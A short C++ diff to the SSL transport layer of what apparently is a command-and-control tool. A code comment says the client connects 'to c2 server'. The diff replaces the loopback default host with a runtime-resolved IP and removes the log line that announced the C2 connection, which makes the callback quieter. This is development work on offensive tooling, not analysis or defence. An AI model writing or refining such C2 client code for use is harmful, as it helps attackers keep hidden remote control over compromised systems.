@@ -117,7 +117,7 @@ void ssl_dump_certs(SSL * ssl) {
 ssl_transport::ssl_transport() {
     m_ctx = NULL;
     m_ssl = NULL;
-    m_opt_host = "127.0.0.1";
+    m_opt_host = sock_get_ip();
     m_opt_port = 443;
 }
 
@@ -174,7 +174,6 @@ int ssl_transport::init(int type) {
     if (type == TPT_CLIENT) {
 
         // if client, connect to c2 server
-        LOG("info: connecting to %s:%d\n", m_opt_host.c_str(), m_opt_port);
         if ((sock = m_tcp.connect(m_opt_host, m_opt_port)) < 0) {
             return -1;
         }
